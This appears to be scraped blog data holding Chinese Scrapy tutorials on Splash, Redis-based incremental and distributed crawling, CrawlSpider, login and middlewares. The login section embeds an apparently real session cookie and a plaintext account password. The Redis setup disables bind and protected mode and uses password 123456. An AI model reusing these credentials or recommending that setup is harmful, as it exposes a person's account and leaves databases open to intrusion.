SPIDER_MIDDLEWARES = &#123;# &#x27;scrapy_splash.SplashDeduplicateArgsMiddleware&#x27;: 100,# &#125;# 去重过滤器, 这个必须要配置DUPEFILTER_CLASS = &#x27;scrapy_splash.SplashAwareDupeFilter&#x27;# 使用Splash的Http缓存, 这个必须要配置HTTPCACHE_STORAGE = &#x27;scrapy_splash.SplashAwareFSCacheStorage&#x27; 最后. 整理修改一下spider 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778import scrapyfrom scrapy_splash.request import SplashRequest# splash的lua脚本lua_source = &quot;&quot;&quot;function main(splash, args) -- 主函数 assert(splash:go(&quot;https://news.163.com/&quot;)) -- 访问url assert(splash:wait(2)) -- 等待 -- 预存一个js函数 get_btn_display = splash:jsfunc([[ function()&#123; return document.getElementsByClassName(&#x27;load_more_btn&#x27;)[0].style.display; &#125; ]]) -- lua的while循环 while(true) do -- 直接执行一个js脚本 -- 向下拉动滚动条. splash:runjs(&quot;document.getElementsByClassName(&#x27;load_more_btn&#x27;)[0].scrollIntoView(true)&quot;) assert(splash:wait(1)) -- 选择 &quot;加载更多&quot; btn = splash:select(&quot;.load_more_btn&quot;) -- 点它 btn:click() -- 判断是否可见 调用上方预制的js函数 ss = get_btn_display() -- 如果是none. 就没有数据了(网易自己设计的) if (ss == &#x27;none&#x27;) then break end end return &#123; html = splash:html(), cookies = splash:get_cookies() &#125; end&quot;&quot;&quot;class WangyiSpider(scrapy.Spider): name = &#x27;wangyi&#x27; allowed_domains = [&#x27;163.com&#x27;] start_urls = [&#x27;http://news.163.com/&#x27;] def start_requests(self): # 发送splash请求 yield SplashRequest( url=self.start_urls[0], callback=self.parse, endpoint=&quot;execute&quot;, args=&#123;&quot;lua_source&quot;: lua_source, &#125; ) def parse(self, resp, **kwargs): divs = resp.xpath(&quot;//ul[@class=&#x27;newsdata_list fixed_bar_padding noloading&#x27;]/li[1]/div[2]/div&quot;) for div in divs: a = div.xpath(&quot;./div/div/h3/a&quot;) if not a: continue href = a.xpath(&#x27;./@href&#x27;).extract_first() title = a.xpath(&#x27;./text()&#x27;).extract_first() print(href) # 可以采用正常的抓取方案 yield scrapy.Request( url=href, callback=self.details ) break def details(self, resp): with open(&quot;data.txt&quot;, mode=&#x27;w&#x27;) as f: f.write(&quot;____&quot;.join(resp.xpath(&quot;//div[@class=&#x27;post_body&#x27;]//p/text()&quot;).extract()))","categories":[{"name":"爬虫开发","slug":"爬虫开发","permalink":"http://blog.ioimp.top/categories/%E7%88%AC%E8%99%AB%E5%BC%80%E5%8F%91/"}],"tags":[{"name":"Scrapy爬虫","slug":"Scrapy爬虫","permalink":"http://blog.ioimp.top/tags/Scrapy%E7%88%AC%E8%99%AB/"}]},{"title":"Scarpy_分布式爬虫","slug":"Scarpy-分布式爬虫","date":"2023-12-03T03:59:26.000Z","updated":"2023-12-03T04:04:23.779Z","comments":true,"path":"2023/12/03/Scarpy-分布式爬虫/","link":"","permalink":"http://blog.ioimp.top/2023/12/03/Scarpy-%E5%88%86%E5%B8%83%E5%BC%8F%E7%88%AC%E8%99%AB/","excerpt":"","text":"分布式爬虫一. 增量式爬虫​ 增量式爬虫, 顾名思义. 可以对网站进行反复抓取. 然后发现新东西了就保存起来. 遇到了以前抓取过的内容就自动过滤掉即可. 其核心思想就两个字. 去重. 并且可以反复去重. 今天运行一下. 明天再运行一下. 将不同的数据过滤出来. 相同的数据去除掉(不保存)即可. ​ 此时, 我们以天涯为目标来尝试一下完成增量式爬虫. spider: 12345678910111213141516171819202122232425262728293031323334353637383940414243import scrapyfrom redis import Redisfrom tianya.items import TianyaItemclass TySpider(scrapy.Spider): name = &#x27;ty&#x27; allowed_domains = [&#x27;tianya.cn&#x27;] start_urls = [&#x27;http://bbs.tianya.cn/list-worldlook-1.shtml&#x27;] def __init__(self, name=None, **kwargs): self.red = Redis(password=&quot;123456&quot;, db=6, decode_responses=True) super().__init__(name, **kwargs) def parse(self, resp, **kwargs): tbodys = resp.css(&quot;.tab-bbs-list tbody&quot;)[1:] for tbody in tbodys: hrefs = tbody.xpath(&quot;./tr/td[1]/a/@href&quot;).extract() for h in hrefs: # 两个方案. url = resp.urljoin(h) # 判断是否在该set集合中有数据 r = self.red.sismember(&quot;tianya:details&quot;, url) # 1. url去重. 优点: 简单, 缺点: 如果有人回复了帖子.就无法提取到最新的数据了 if not r: yield scrapy.Request(url=resp.urljoin(h), callback=self.parse_details) else: print(f&quot;该url已经被抓取过&#123;url&#125;&quot;) next_href = resp.xpath(&quot;//div[@class=&#x27;short-pages-2 clearfix&#x27;]/div[@class=&#x27;links&#x27;]/a[last()]/@href&quot;).extract_first() yield scrapy.Request(url=resp.urljoin(next_href), callback=self.parse) def parse_details(self, resp, **kwargs): title = resp.xpath(&#x27;//*[@id=&quot;post_head&quot;]/h1/span[1]/span/text()&#x27;).extract_first() content = resp.xpath(&#x27;//*[@id=&quot;bd&quot;]/div[4]/div[1]/div/div[2]/div[1]/text()&#x27;).extract_first() item = TianyaItem() item[&#x27;title&#x27;] = title item[&#x27;content&#x27;] = content # 提取完数据. 该url进入redis self.red.sadd(&quot;tianya:details&quot;, resp.url) return item ​ pipelines 123456789101112131415161718192021222324252627282930# Define your item pipelines here## Don&#x27;t forget to add your pipeline to the ITEM_PIPELINES setting# See: https://docs.scrapy.org/en/latest/topics/item-pipeline.html# useful for handling different item types with a single interfacefrom itemadapter import ItemAdapterfrom redis import Redisimport jsonclass TianyaPipeline: def process_item(self, item, spider): # 2. 数据内容去重. 优点: 保证数据的一致性. 缺点: 需要每次都把数据从网页中提取出来 print(json.dumps(dict(item))) r = self.red.sadd(&quot;tianya:pipelines:items&quot;, json.dumps(dict(item))) if r: # 进入数据库 print(&quot;存入数据库&quot;, item[&#x27;title&#x27;]) else: print(&quot;已经在数据里了&quot;, item[&#x27;title&#x27;]) return item def open_spider(self, spider): self.red = Redis(password=&quot;123456&quot;, db=6) def close_spider(self, spider): self.red.close() 上述方案是直接用redis进行的去重. 我们还可以选择使用数据库, mongodb进行过滤. 原理都一样, 不在赘述. 二. 分布式爬虫​ 分布式爬虫, 就是搭建一个分布式的集群, 让其对一组资源进行分布联合爬取. ​ 既然要集群来抓取. 意味着会有好几个爬虫同时运行. 那此时就非常容易产生这样一个问题. 如果有重复的url怎么办? 在原来的程序中. scrapy中会由调度器来自动完成这个任务. 但是, 此时是多个爬虫一起跑. 而我们又知道不同的机器之间是不能直接共享调度器的. 怎么办? 我们可以采用redis来作为各个爬虫的调度器. 此时我们引出一个新的模块叫scrapy-redis. 在该模块中提供了这样一组操作. 它们重写了scrapy中的调度器. 并将调度队列和去除重复的逻辑全部引入到了redis中. 这样就形成了这样一组结构 ​ 整体工作流程: 1. 某个爬虫从redis_key获取到起始url. 传递给引擎, 到调度器. 然后把起始url直接丢到redis的请求队列里. 开始了scrapy的爬虫抓取工作. 2. 如果抓取过程中产生了新的请求. 不论是哪个节点产生的, 最终都会到redis的去重集合中进行判定是否抓取过. 3. 如果抓取过. 直接就放弃该请求. 如果没有抓取过. 自动丢到redis请求队列中. 4. 调度器继续从redis请求队列里获取要进行抓取的请求. 完成爬虫后续的工作. 接下来. 我们用scrapy-redis完成上述流程 首先, 创建项目, 和以前一样, 该怎么创建还怎么创建. 修改Spider. 将start_urls注释掉. 更换成redis_key 然后再settings中对redis以及scrapy_redis配置一下 1234567891011121314151617REDIS_HOST = &quot;127.0.0.1&quot;REDIS_PORT = 6379REDIS_DB = 8REDIS_PARAMS = &#123; &quot;password&quot;:&quot;123456&quot;&#125;# scrapy-redis配置信息 # 固定的SCHEDULER = &quot;scrapy_redis.scheduler.Scheduler&quot;SCHEDULER_PERSIST = True # 如果为真. 在关闭时自动保存请求信息, 如果为假, 则不保存请求信息DUPEFILTER_CLASS = &quot;scrapy_redis.dupefilter.RFPDupeFilter&quot; # 去重的逻辑. 要用redis的ITEM_PIPELINES = &#123; &#x27;tianya2.pipelines.Tianya2Pipeline&#x27;: 300, &#x27;scrapy_redis.pipelines.RedisPipeline&#x27;: 301 # 配置redis的pipeline&#125; 布隆过滤器: ​ 平时, 我们如果需要对数据进行去重操作可以有以下方案: 1. 直接用set集合来存储url. (最low的方案) 2. 用set集合存储hash过的url. scrapy默认 3. 用redis来存储hash过的请求, scrapy-redis默认就是这样做的. 如果请求非常非常多. redis压力是很大的. 4. 用布隆过滤器. 布隆过滤器的原理: 其实它里面就是一个改良版的bitmap. 何为bitmap, 假设我提前准备好一个数组, 然后把源数据经过hash计算. 会计算出一个数字. 我们按照下标来找到该下标对应的位置. 然后设置成1. 12345678910111213a = 李嘉诚b = 张翠山....[0],[0],[0],[0],[0],[0],[0],[0],[0] 10个长度数组hash(a) = 3hash(b) = 3[0],[0],[0],[1],[0],[0],[0],[0],[0] hash(张三) = 6# 找的时候依然执行该hash算法. 然后直接去找对应下标的位置看看是不是1. 是1就有, 不是1就没有 这样有个不好的现象. 容易误判. 如果hash算法选的不够好. 很容易搞错. 那怎么办. 多选几个hash算法 1234567891011121314a = 李嘉诚b = 张翠山[0],[0],[0],[0],[0],[0],[0],[0],[0],[0]hash1(a) = 3hash2(a) = 4hash1(b) = 2hash2(b) = 5[0],[0],[1],[1],[1],[1],[0],[0],[0],[0]# 找的时候, 重新按照这个hash的顺序, 在重新执行一遍. 依然会得到2个值. 分别去这两个位置看是否是1. 如果全是1, 就有, 如果有一个是0, 就没有. 在scrapy-redis中想要使用布隆过滤器是非常简单的. 你可以自己去写这个布隆过滤器的逻辑. 不过我建议直接用第三方的就可以了 123456789# 安装布隆过滤器pip install scrapy_redis_bloomfilter# 去重类，要使用 BloomFilter 请替换 DUPEFILTER_CLASSDUPEFILTER_CLASS = &quot;scrapy_redis_bloomfilter.dupefilter.RFPDupeFilter&quot;# 哈希函数的个数，默认为 6，可以自行修改BLOOMFILTER_HASH_NUMBER = 6# BloomFilter 的 bit 参数，默认 30，占用 128MB 空间，去重量级 1 亿BLOOMFILTER_BIT = 30","categories":[{"name":"爬虫开发","slug":"爬虫开发","permalink":"http://blog.ioimp.top/categories/%E7%88%AC%E8%99%AB%E5%BC%80%E5%8F%91/"}],"tags":[{"name":"Scrapy爬虫","slug":"Scrapy爬虫","permalink":"http://blog.ioimp.top/tags/Scrapy%E7%88%AC%E8%99%AB/"}]},{"title":"crawlSpider","slug":"crawlSpider","date":"2023-12-03T03:58:31.000Z","updated":"2023-12-03T03:59:08.333Z","comments":true,"path":"2023/12/03/crawlSpider/","link":"","permalink":"http://blog.ioimp.top/2023/12/03/crawlSpider/","excerpt":"","text":"Scrapy抓取全网站数据一. 使用常规Spider我们把目光对准汽车之家. 抓取二手车信息. 注意, 汽车之家的访问频率要控制一下. 要不然会跳验证的. 1DOWNLOAD_DELAY = 3 12345678910111213141516171819202122232425class ErshouSpider(scrapy.Spider): name = &#x27;ershou&#x27; allowed_domains = [&#x27;che168.com&#x27;] start_urls = [&#x27;https://www.che168.com/beijing/a0_0msdgscncgpi1ltocsp100exx0/?pvareaid=102179#currengpostion&#x27;] def parse(self, resp, **kwargs): # print(resp.text) # 链接提取器 le = LinkExtractor(restrict_xpaths=(&quot;//ul[@class=&#x27;viewlist_ul&#x27;]/li/a&quot;,), deny_domains=(&quot;topicm.che168.com&quot;,) ) links = le.extract_links(resp) for link in links: yield scrapy.Request( url=link.url, callback=self.parse_detail ) # 翻页功能 le2 = LinkExtractor(restrict_xpaths=(&quot;//div[@id=&#x27;listpagination&#x27;]/a&quot;,)) pages = le2.extract_links(resp) for page in pages: yield scrapy.Request(url=page.url, callback=self.parse_detail) def parse_detail(self, resp, **kwargs): title = resp.xpath(&#x27;/html/body/div[5]/div[2]/h3/text()&#x27;).extract_first() print(title) LinkExtractor: 链接提取器. 可以非常方便的帮助我们从一个响应页面中提取到url链接. 我们只需要提前定义好规则即可. 参数: ​ allow, 接收一堆正则表达式, 可以提取出符合该正则的链接​ deny, 接收一堆正则表达式, 可以剔除符合该正则的链接​ allow_domains: 接收一堆域名, 符合里面的域名的链接被提取​ deny_domains: 接收一堆域名, 剔除不符合该域名的链接​ restrict_xpaths: 接收一堆xpath, 可以提取符合要求xpath的链接​ restrict_css: 接收一堆css选择器, 可以提取符合要求的css选择器的链接​ tags: 接收一堆标签名, 从某个标签中提取链接, 默认a, area​ attrs: 接收一堆属性名, 从某个属性中提取链接, 默认href 值得注意的, &#x3D;&#x3D;在提取到的url中, 是有重复的内容的. 但是我们不用管. scrapy会自动帮我们过滤掉重复的url请求.&#x3D;&#x3D; 二. 使用CrawlSpider在scrapy中提供了CrawlSpider来完成全站数据抓取. 创建项目 scrapy startproject qichezhijia 进入项目 cd qichezhijia 创建爬虫(CrawlSpider) scrapy genspider &#x3D;&#x3D;-t crawl&#x3D;&#x3D; ershouche che168.com 和以往的爬虫不同. 该爬虫需要用到crawl的模板来创建爬虫. 修改spider中的rules和回调函数 1234567891011121314class ErshoucheSpider(CrawlSpider): name = &#x27;ershouche&#x27; allowed_domains = [&#x27;che168.com&#x27;, &#x27;autohome.com.cn&#x27;] start_urls = [&#x27;https://www.che168.com/beijing/a0_0msdgscncgpi1ltocsp1exx0/&#x27;] le = LinkExtractor(restrict_xpaths=(&quot;//ul[@class=&#x27;viewlist_ul&#x27;]/li/a&quot;,), deny_domains=(&quot;topicm.che168.com&quot;,) ) le1 = LinkExtractor(restrict_xpaths=(&quot;//div[@id=&#x27;listpagination&#x27;]/a&quot;,)) rules = ( Rule(le1, follow=True), # 单纯为了做分页 Rule(le, callback=&#x27;parse_item&#x27;, follow=False), # 单纯提取数据 ) def parse_item(self, response): print(response.url) CrawlSpider的工作流程. 前期和普通的spider是一致的. 在第一次请求回来之后. 会自动的将返回的response按照rules中订制的规则来提取链接. 并进一步执行callback中的回调. 如果follow是True, 则继续在响应的内容中继续使用该规则提取链接. 相当于在parse中的scrapy.request(xxx, callback&#x3D;self.parse) 三. Redis简单使用​ redis作为一款目前这个星球上性能最高的非关系型数据库之一. 拥有每秒近十万次的读写能力. 其实力只能用恐怖来形容. 安装redis redis是我见过这个星球上最好安装的软件了. 比起前面的那一坨. 它简直了… 直接把压缩包解压. 然后配置一下环境变量就可以了. 接下来, 在环境变量中将该文件夹配置到path中. win7的同学自求多福吧… 我们给redis多配置几个东西(修改redis的配置文件, mac是: redis.conf, windows是: ) 关闭bind 1# bind 127.0.0.1 ::1 # 注释掉它 关闭保护模式 windows不用设置 1protected-mode no # 设置为no 设置密码 1requirepass 123456 # 设置密码 将redis怼到windows服务&#x3D;&#x3D;必须进入到redis目录后才可以&#x3D;&#x3D; 12345678# 将redis安装到windows服务redis-server.exe --service-install redis.windows.conf --loglevel verbose# 卸载服务：redis-server --service-uninstall# 开启服务：redis-server --service-start# 停止服务：redis-server --service-stop 使用redis-cli链接redis 12redis-cli -h ip地址 -p 端口 --raw # raw可以让redis显示出中文auth 密码 # 如果有密码可以这样来登录, 如果没有.不用这一步 附赠RDM, redis desktop manager. 可以帮我们完成redis数据库的可视化操作(需要就装, 不需要就算) redis常见数据类型 redis中常见的数据类型有5个. 命令规则: 命令 key 参数 string 字符串(它自己认为是字符串, 我认为是任何东西. ), redis最基础的数据类型. 常用命令 12345set key value # 添加一条数据get key # 查看一条数据incr key # 让该key对应的数据自增1(原子性, 安全)incrby key count # 让该key对应的value自增 count type key # 查看数据类型(set进去的东西一律全是字符串) 例如 12345678set name zhangsan # 添加数据 name = zhangsanget name # 查看数据 zhangsanset age 10get age # 10incr age # 11get age # 11incrby age 5 # 16 hash 哈希, 相当于字典. 常见操作 1234567hset key k1 v1 # 将k1, v1存储在key上hget key k1 # 将key上的k1提取出来hmset key k1 v1 k2 v2 k3 v3.... # 一次性将多个k,v存储在keyhmget key k1 k2....# 一次性将key中的k1, k2...提取出来hgetall key # 一次性将key中所有内容全部提取hkeys key # 将key中所有的k全部提取hvals key # 将key中所有的v全部提取 示例: 12345HMSET stu id 1 name sylar age 18HMGET stu name age # syalr 18HGETALL stu # id 1 name sylar age 18HKEYS stu # id name ageHVALS stu # 1 syalr 18 list 列表, 底层是一个双向链表. 可以从左边和右边进行插入. 记住每次插入都要记得这货是个&#x3D;&#x3D;双向链表&#x3D;&#x3D; 常见操作 1234567LPUSH key 数据1 数据2 数据3.... # 从左边插入数据RPUSH key 数据1 数据2 数据3.... # 从右边插入数据LRANGE key start stop # 从start到stop提取数据. LLEN key # 返回key对应列表的长度LPOP key # 从左边删除一个.并返回被删除元素RPOP key # 从右边删除一个.并返回被删除元素 示例: 123456LPUSH banji yiban erban sanban sibanLRANGE banji 0 -1 # yiban erban sanban sibanRPUSH ban ban1 ban2 ban3LRANGE ban 0 -1 # ban1 ban2 ban3LPOP ban # ban1LLEN key # 2 set set是无序的超大集合. 无序, 不重复. 常见操作 123456789SADD key 值 # 向集合内存入数据SMEMBERS key # 查看集合内所有元素SCARD key # 查看key中元素的个数SISMEMBER key val # 查看key中是否包含valSUNION key1 key2 # 并集SDIFF key1 key2 # 差集合, 在key1中, 但不在key2中的数据SINTER key1 key2 # 计算交集, 在key1和key2中都出现了的SPOP key # 随机从key中删除一个数据SRANDMEMBER key count # 随机从key中查询count个数据 实例: 1234567891011SADD stars 柯震东 吴亦凡 张默 房祖名 # 4SADD stars 吴亦凡 # 0. 重复的数据是存储不进去的.SMEMBERS stars # 柯震东 吴亦凡 张默 房祖名SISMEMBER stars 吴亦凡 # 吴亦凡在 stars里么? 1 在 0 不在SADD my 周杰伦 吴亦凡 房祖名 SINTER stars my # 计算交集 吴亦凡 房祖名SPOP my # 随机删除一个SRANDMEMEBER my 2 # 从集合总随机查看2个 zset 有序集合, 有序集合中的内容也是不可以重复的. 并且存储的数据也是redis最基础的string数据. 但是在存储数据的同时还增加了一个score. 表示分值. redis就是通过这个score作为排序的规则的. 常用操作 12345678ZADD key s1 m1 s2 m2 ... # 向key中存入 m1 m2 分数分别为s1 s2ZRANGE key start stop [withscores] # 查看从start 到stop中的所有数据 [是否要分数]ZREVRANGE key start stop # 倒叙查看start到stop的数据ZCARD key # 查看zset的数据个数ZCOUNT key min max # 查看分数在min和max之间的数据量ZINCRBY key score member # 将key中member的分值scoreZSCORE key m # 查看key中m的分值 示例: 1234567ZADD fam 1 sylar 2 alex 3 tory # 添加三个数据ZRANGE fam 0 -1 WITHSCORES # 正序查看ZREVRANGE fam 0 -1 WITHSCORES # 倒叙查看ZINCRBY fam 10 alex # 给alex加10分ZADD fam 100 alex # 给alex修改分数为100分ZSCORE fam alex # 查看alex的分数ZCARD fam # 查看fam的数据个数 redis还有非常非常多的操作. 我们就不一一列举了. 各位可以在网络上找到非常多的资料. &#x3D;&#x3D;各位大佬们注意. 数据保存完一定要save一下, 避免数据没有写入硬盘而产生的数据丢失&#x3D;&#x3D; 四. python搞定redis​ python处理redis使用专用的redis模块. 同样的, 它也是一个第三方库. 1pip install redis ​ 获取连接(1) 1234567from redis import Redisred = Redis(host=&quot;127.0.0.1&quot;, # 地址 port=6379, # 端口 db=0, # 数据库 password=123456, # 密码 decode_responses=True) # 是否自动解码 ​ 获取连接(2) 12345678910pool = redis.ConnectionPool( host=&quot;127.0.0.1&quot;, # 地址 port=6379, # 端口 db=0, # 数据库 password=123456, # 密码 decode_responses=True)r = redis.Redis(connection_pool=pool)print(r.keys()) ​ 我们以一个免费代理IP池能用到的操作来尝试一下redis 1234567891011121314151617181920212223242526272829303132333435363738394041424344# 存入数据red.set(&quot;sylar&quot;, &quot;邱彦涛&quot;)# 获取数据print(red.get(&quot;sylar&quot;))lst = [&quot;张三丰&quot;, &quot;张无忌&quot;, &quot;张翠山&quot;, &quot;张娜拉&quot;]red.lpush(&quot;names&quot;, *lst) # 将所有的名字都存入names# # 查询所有数据result = red.lrange(&quot;names&quot;, 0, -1)print(result)# 从上面的操作上可以看出. python中的redis和redis-cli中的操作是几乎一样的# 接下来, 咱们站在一个代理IP池的角度来分析各个功能# 抓取到了IP. 保存入库red.zadd(&quot;proxy&quot;, &#123;&quot;192.168.1.1&quot;: 10, &quot;192.168.1.2&quot;: 10&#125;)red.zadd(&quot;proxy&quot;, &#123;&quot;192.168.1.3&quot;: 10, &quot;192.168.1.6&quot;: 10&#125;)red.zadd(&quot;proxy&quot;, &#123;&quot;192.168.1.4&quot;: 10, &quot;192.168.1.7&quot;: 10&#125;)red.zadd(&quot;proxy&quot;, &#123;&quot;192.168.1.5&quot;: 10, &quot;192.168.1.8&quot;: 10&#125;)# 给某一个ip增加到100分red.zadd(&quot;proxy&quot;, &#123;&quot;192.168.1.4&quot;: 100&#125;)# 给&quot;192.168.1.4&quot; 扣10分red.zincrby(&quot;proxy&quot;, -10, &quot;192.168.1.4&quot;)# 分扣没了. 删除掉它red.zrem(&quot;proxy&quot;, &quot;192.168.1.4&quot;)# 可用的代理数量c = red.zcard(&quot;proxy&quot;)print(c)# 根据分值进行查询(0~100)之间r = red.zrangebyscore(&quot;proxy&quot;, 0, 100)print(r)# 查询前100个数据(分页查询)r = red.zrevrange(&#x27;proxy&#x27;, 0, 100)# 判断proxy是否存在, 如果是None就是不存在r = red.zscore(&quot;proxy&quot;, &quot;192.168.1.4&quot;)print(r)","categories":[{"name":"爬虫开发","slug":"爬虫开发","permalink":"http://blog.ioimp.top/categories/%E7%88%AC%E8%99%AB%E5%BC%80%E5%8F%91/"}],"tags":[{"name":"Scrapy爬虫","slug":"Scrapy爬虫","permalink":"http://blog.ioimp.top/tags/Scrapy%E7%88%AC%E8%99%AB/"}]},{"title":"Scrapy_模拟登录与中间件","slug":"Scrapy-模拟登录与中间件","date":"2023-12-03T03:57:12.000Z","updated":"2023-12-03T03:58:19.284Z","comments":true,"path":"2023/12/03/Scrapy-模拟登录与中间件/","link":"","permalink":"http://blog.ioimp.top/2023/12/03/Scrapy-%E6%A8%A1%E6%8B%9F%E7%99%BB%E5%BD%95%E4%B8%8E%E4%B8%AD%E9%97%B4%E4%BB%B6/","excerpt":"","text":"模拟登录与中间件一. Scrapy处理cookie​ 在requests中我们讲解处理cookie主要有两个方案. 第一个方案. 从浏览器里直接把cookie搞出来. 贴到heades里. 这种方案, 简单粗暴. 第二个方案是走正常的登录流程. 通过session来记录请求过程中的cookie. 那么到了scrapy中如何处理cookie? 其实也是这两个方案. ​ 首先, 我们依然是把目标定好, 还是我们的老朋友, https://user.17k.com/ck/author/shelf?page=1&amp;appKey=2406394919 ​ 这个url必须要登录后才能访问(用户书架). &#x3D;&#x3D;对于该网页而言&#x3D;&#x3D;, 就必须要用到cookie了. 首先, 创建项目, 建立爬虫. 把该填的地方填上. 123456789101112import scrapyfrom scrapy import Request, FormRequestclass LoginSpider(scrapy.Spider): name = &#x27;login&#x27; allowed_domains = [&#x27;17k.com&#x27;] start_urls = [&#x27;https://user.17k.com/ck/author/shelf?page=1&amp;appKey=2406394919&#x27;] def parse(self, response): print(response.text) ​ 此时运行时, 显示的是该用户还未登录. 不论是哪个方案. 在请求到start_urls里面的url之前必须得获取到cookie. 但是默认情况下, scrapy会自动的帮我们完成其实request的创建. 此时, 我们需要自己去组装第一个请求. 这时就需要我们自己的爬虫中重写start_requests()方法. 该方法负责起始request的组装工作. 我们不妨先看看原来的start_requests()是如何工作的. 1234567891011121314151617181920212223# 以下是scrapy源码def start_requests(self): cls = self.__class__ if not self.start_urls and hasattr(self, &#x27;start_url&#x27;): raise AttributeError( &quot;Crawling could not start: &#x27;start_urls&#x27; not found &quot; &quot;or empty (but found &#x27;start_url&#x27; attribute instead, &quot; &quot;did you miss an &#x27;s&#x27;?)&quot;) if method_is_overridden(cls, Spider, &#x27;make_requests_from_url&#x27;): warnings.warn( &quot;Spider.make_requests_from_url method is deprecated; it &quot; &quot;won&#x27;t be called in future Scrapy releases. Please &quot; &quot;override Spider.start_requests method instead (see %s.%s).&quot; % ( cls.__module__, cls.__name__ ), ) for url in self.start_urls: yield self.make_requests_from_url(url) else: for url in self.start_urls: # 核心就这么一句话. 组建一个Request对象.我们也可以这么干. yield Request(url, dont_filter=True) 自己写个start_requests()看看. 123456def start_requests(self): print(&quot;我是万恶之源&quot;) yield Request( url=LoginSpider.start_urls[0], callback=self.parse ) 接下来, 我们去处理cookie 1. 方案一, 直接从浏览器复制cookie过来12345678910111213def start_requests(self): # 直接从浏览器复制 cookies = &quot;GUID=bbb5f65a-2fa2-40a0-ac87-49840eae4ad1; c_channel=0; c_csc=web; Hm_lvt_9793f42b498361373512340937deb2a0=1627572532,1627711457,1627898858,1628144975; accessToken=avatarUrl%3Dhttps%253A%252F%252Fcdn.static.17k.com%252Fuser%252Favatar%252F16%252F16%252F64%252F75836416.jpg-88x88%253Fv%253D1610625030000%26id%3D75836416%26nickname%3D%25E5%25AD%25A4%25E9%25AD%2582%25E9%2587%258E%25E9%25AC%25BCsb%26e%3D1643697376%26s%3D73f8877e452e744c; sensorsdata2015jssdkcross=%7B%22distinct_id%22%3A%2275836416%22%2C%22%24device_id%22%3A%2217700ba9c71257-035a42ce449776-326d7006-2073600-17700ba9c728de%22%2C%22props%22%3A%7B%22%24latest_traffic_source_type%22%3A%22%E7%9B%B4%E6%8E%A5%E6%B5%81%E9%87%8F%22%2C%22%24latest_referrer%22%3A%22%22%2C%22%24latest_referrer_host%22%3A%22%22%2C%22%24latest_search_keyword%22%3A%22%E6%9C%AA%E5%8F%96%E5%88%B0%E5%80%BC_%E7%9B%B4%E6%8E%A5%E6%89%93%E5%BC%80%22%7D%2C%22first_id%22%3A%22bbb5f65a-2fa2-40a0-ac87-49840eae4ad1%22%7D; Hm_lpvt_9793f42b498361373512340937deb2a0=1628145672&quot; cookie_dic = &#123;&#125; for c in cookies.split(&quot;; &quot;): k, v = c.split(&quot;=&quot;) cookie_dic[k] = v yield Request( url=LoginSpider.start_urls[0], cookies=cookie_dic, callback=self.parse ) 这种方案和原来的requests几乎一模一样. 需要注意的是: cookie需要通过cookies参数进行传递! 2. 方案二, 完成登录过程.123456789101112131415161718192021222324252627282930313233def start_requests(self): # 登录流程 username = &quot;18614075987&quot; password = &quot;q6035945&quot; url = &quot;https://passport.17k.com/ck/user/login&quot; # 发送post请求 # yield Request( # url=url, # method=&quot;post&quot;, # body=&quot;loginName=18614075987&amp;password=q6035945&quot;, # callback=self.parse # ) # 发送post请求 yield FormRequest( url=url, formdata=&#123; &quot;loginName&quot;: username, &quot;password&quot;: password &#125;, callback=self.parse ) def parse(self, response): # 得到响应结果. 直接请求到默认的start_urls yield Request( url=LoginSpider.start_urls[0], callback=self.parse_detail )def parse_detail(self, resp): print(resp.text) ​ 注意, 发送post请求有两个方案, Scrapy.Request(url&#x3D;url, method&#x3D;’post’, body&#x3D;数据) Scarpy.FormRequest(url&#x3D;url, formdata&#x3D;数据) -&gt; 推荐 区别: 方式1的数据只能是字符串. 这个就很难受. 所以推荐用第二种. 二. Scrapy的中间件​ 中间件的作用: 负责处理引擎和爬虫以及引擎和下载器之间的请求和响应. 主要是可以对request和response做预处理. 为后面的操作做好充足的准备工作. 在python中准备了两种中间件, 分别是下载器中间件和爬虫中间件. 1. DownloaderMiddleware​ 下载中间件, 它是介于引擎和下载器之间, 引擎在获取到request对象后, 会交给下载器去下载, 在这之间我们可以设置下载中间件. 它的执行流程: ​ 引擎拿到request -&gt; 中间件1(process_request) -&gt; 中间件2(process_request) …..-&gt; 下载器-|​ 引擎拿到request &lt;- 中间件1(process_response) &lt;- 中间件2(process_response) ….. &lt;-下载器-| 1234567891011121314151617181920212223242526272829class MidDownloaderMiddleware1: def process_request(self, request, spider): print(&quot;process_request&quot;, &quot;ware1&quot;) return None def process_response(self, request, response, spider): print(&quot;process_response&quot;, &quot;ware1&quot;) return response def process_exception(self, request, exception, spider): print(&quot;process_exception&quot;, &quot;ware1&quot;) passclass MidDownloaderMiddleware2: def process_request(self, request, spider): print(&quot;process_request&quot;, &quot;ware2&quot;) return None def process_response(self, request, response, spider): print(&quot;process_response&quot;, &quot;ware2&quot;) return response def process_exception(self, request, exception, spider): print(&quot;process_exception&quot;, &quot;ware2&quot;) pass 设置中间件 12345DOWNLOADER_MIDDLEWARES = &#123; # &#x27;mid.middlewares.MidDownloaderMiddleware&#x27;: 542, &#x27;mid.middlewares.MidDownloaderMiddleware1&#x27;: 543, &#x27;mid.middlewares.MidDownloaderMiddleware2&#x27;: 544,&#125; 优先级参考管道. 运行效果; 接下来, 我们来说说这几个方法的返回值问题(难点) process_request(request, spider): 在每个请求到达下载器之前调用 一, return None 不拦截, 把请求继续向后传递给权重低的中间件或者下载器 二, return request 请求被拦截, 并将一个新的请求返回. 后续中间件以及下载器收不到本次请求 三, return response 请求被拦截, 下载器将获取不到请求, 但是引擎是可以接收到本次响应的内容, 也就是说在当前方法内就已经把响应内容获取到了. proccess_response(request, response, spider): 每个请求从下载器出来调用 一, return response 通过引擎将响应内容继续传递给其他组件或传递给其他process_response()处理 二, return request 响应被拦截. 将返回内容直接回馈给调度器(通过引擎), 后续process_response()接收不到响应内容. OK, 至此, 中间件的含义算是完事儿了. 那这东西有啥用? 我们上案例! 1.1. 动态随机设置UA设置统一的UA很简单. 直接在settings里设置即可. 1USER_AGENT = &#x27;User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_4) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.131 Safari/537.36&#x27; 但是这个不够好, 我希望得到一个随机的UA. 此时就可以这样设计, 首先, 在settings里定义好一堆UserAgent. http://useragentstring.com/pages/useragentstring.php?name=Chrome 12345678910111213141516171819202122USER_AGENT_LIST = [ &#x27;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/70.0.3538.77 Safari/537.36&#x27;, &#x27;Mozilla/5.0 (X11; Ubuntu; Linux x86_64) AppleWebKit/537.36 